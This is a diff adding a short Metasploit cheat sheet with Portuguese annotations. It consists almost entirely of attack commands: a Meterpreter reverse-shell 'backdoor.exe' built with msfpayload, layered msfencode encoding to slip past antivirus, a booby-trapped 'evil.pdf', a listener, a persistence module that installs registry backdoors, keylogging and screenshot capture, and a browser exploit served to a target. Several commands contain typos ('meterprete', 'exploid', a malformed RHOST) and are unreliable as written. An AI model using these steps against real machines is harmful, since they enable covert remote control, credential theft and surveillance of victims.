@@ -1,0 +1,77 @@
+Metasploit Framework
+====================
+
+# ./msfupdate
+U --> Updated
+A --> Appended foi acrescentado
+D --> Deleted não é mais utilizado
+# msfpayload -h
+olhe os formatos
+
+# msfpayload -l
+lista os payloads existentes
+
+# msfpayload windows/meterprete/reverse_tcp LHOST=192.168.1.2 LPORT=443 RHOST=192.168.16810  X> backdoor.exe
+
+# ls
+
+# msfpayload windows/meterprete/reverse_tcp \ 
+LHOST=192.168.1.2 LPORT=443 RHOST=192.168.16810 \
+R> | msfencode -c 15 -e x86/shikata_ga_nai -a x86 -t raw | \
+msfencode -c 5 -a x86/alpha_mixed -t raw | \
+msfencode -c 3 -a x86/call4_dword xor -t exe > backdoor2.exe
+
+msfencode -l
+
+olhe no hank para ver qual esta melhor ranquiado
+
+msfcli exploit/multi/handler PAYLOAD=windows/meterprete/reverse_tcp \
+LHOST=192.168.1.10 LPORT=443 E
+
+msfconsole
+
+use exploid/windows/fileformat/adobe_pdf_embedded_exe
+set INFILENAME apresenta.pdf
+set FILENAME evil.pdf
+set PAYLOAD windows/meterprete/reverse_tcp
+set LHOST 192.168.1.2
+set LPORT 443
+exploit
+
+criou o arquivo
+
+use exploid/multi/handler
+set PAYLOAD windows/meterprete/reverse_tcp
+set LHOST 192.168.1.2
+set LPORT 443
+exploit
+run persistence -X <-- vai criar chaves no registro e 
+instalar backdoors
+
+
+use exploid/multi/handler
+set PAYLOAD windows/meterprete/reverse_tcp
+set LHOST 192.168.1.2
+set LPORT 443
+exploit
+
+keyscan_start
+
+keyscan_dump
+
+keyscan_stop
+
+screenshot
+
+
+use exploid/windows/browser/ms10_046_shortcut_icon_dllloader
+set PAYLOAD windows/meterprete/reverse_tcp
+set LHOST 192.168.1.2
+set LPORT 5544
+set SRVHOST 192.168.1.2
+set SRVPORT 443
+exploit
+
+carregue a url no alvo
+http://192.168.1.2/
+
